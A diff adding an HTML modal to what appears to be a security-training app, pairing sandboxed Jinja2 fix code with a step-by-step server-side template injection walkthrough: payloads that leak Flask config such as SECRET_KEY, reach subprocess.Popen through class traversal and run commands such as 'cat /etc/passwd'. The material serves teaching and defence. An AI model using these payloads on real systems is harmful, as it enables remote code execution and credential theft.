@@ -1,0 +1,96 @@
+<!-- Custom CSS Modal for Security Fix -->
+<div id="secureFixModal" class="custom-modal">
+    <div class="modal-overlay"></div>
+    <div class="modal-container">
+        <div class="modal-header">
+            <h2 class="modal-title">
+                🛡️ Security Fix for SSTI Injection
+            </h2>
+            <button type="button" class="close-btn" onclick="closeModal()">&times;</button>
+        </div>
+        <div class="modal-body">
+            <div class="tabs-container">
+                <div class="tab-buttons">
+                    <!-- <button class="tab-btn active" onclick="showTab('vulnerability')">Vulnerability</button> -->
+                    <button class="tab-btn active" style="font-weight: bold; font-size: 18px;" onclick="showTab('secure-code')">Secure Code</button>
+                    <button class="tab-btn " style="font-weight: bold; font-size: 18px;" onclick="showTab('prevention')">Solution</button>
+                </div>
+
+                <div class="tab-content">
+                    <div id="secure-code" class="tab-panel active">
+                        <h4>Secure SSTI Implementation</h4>
+                        <pre class="code-block"><code>
+import html, re
+from jinja2 import FileSystemLoader, select_autoescape, StrictUndefined
+from jinja2.sandbox import SandboxedEnvironment
+
+env = SandboxedEnvironment(
+    loader=FileSystemLoader("templates"),
+    autoescape=select_autoescape(["html", "xml"]),
+    undefined=StrictUndefined
+)
+
+# Escape + neutralize Jinja delimiters
+JINJA_SIGNS = re.compile(r"(\{\{|\}\}|\{\%|\%\}|\{\#|\#\})")
+def sanitize(s: str) -> str:
+    return JINJA_SIGNS.sub(lambda m: m.group(1).replace("{","&#123;").replace("}","&#125;"),
+                           html.escape(s, quote=True))
+
+# Render only whitelisted templates
+APPROVED = {"blog": "blog.html"}
+def render_safe(key: str, title: str, body: str) -> str:
+    tpl = APPROVED.get(key)
+    if not tpl: raise ValueError("Invalid template")
+    return env.get_template(tpl).render(title=sanitize(title), body=sanitize(body))</code></pre>
+                    </div>
+
+                    <div id="prevention" class="tab-panel">
+                               
+                        <h4>Detect SSTI</h4>
+                        <p>If the blog lets you submit content (e.g., blog title, body, comment) and renders it with Jinja2, you test injection with something harmless:</p>
+                        {% raw %}
+                        <pre><code>{{ 7*7 }}</code></pre>
+                        {% endraw %}
+                        <li>If the page shows 49, that means user input is being evaluated by the template engine. Vulnerability confirmed.</li><br>
+
+                        <h4>Explore Server Info</h4>
+                        <p>Jinja2 lets you access Python objects through the template environment. A classic trick is to traverse from objects to get sensitive information.</p>
+                        {% raw %}
+                        <pre><code>{{ config }}</code></pre>
+                        {% endraw %}
+                        <li>Often leaks Flask/Jinja2 application config (e.g., SECRET_KEY, DEBUG, etc.).</li><br>
+                    
+                        <h4>Arbitrary code execution test</h4>
+                        <ol>   
+                            <li>First, enumerate the class list in your blog post:</li>
+                             {% raw %}
+                            <pre><code>{{ ''.__class__.__mro__[1].__subclasses__() }}</code></pre>
+                            {% endraw %}
+                            <p>This will dump a huge list of all classes (like, etc). <pre><code>&lt;class 'subprocess.Popen'&gt;, &lt;class 'warnings.catch_warnings'&gt;</code></pre></p>
+
+                            <li>Find the index of "subprocess.Popen." Example payload:</li>
+                            {% raw %}
+                            <pre><code>{{ ''.__class__.__mro__[1].__subclasses__()[418]}}</code></pre>
+                            {% endraw %}
+
+                            <p>Keep changing the index until it shows. <pre><code>&lt;class 'subprocess.Popen'&gt;</code></pre></p><br>
+
+                            <p>Once you've found it — say, if it's at 418, then use:</p>
+                             {% raw %}
+                            <pre><code>{{ ''.__class__.__mro__[1].__subclasses__()[418](['ls','-la'], stdout=-1).communicate()[0].decode() }}</code></pre> 
+                            {% endraw %}
+
+                            <p>This executes ls and prints the output.</p>
+                            <p>You can replace "ls" with any command, e.g., "cat /etc/passwd".</p>
+                        </ol> <br>    
+                        
+                        <h4>OWASP References</h4>
+                        <ul>
+                            <li><a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection" target="_blank">OWASP SSTI</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
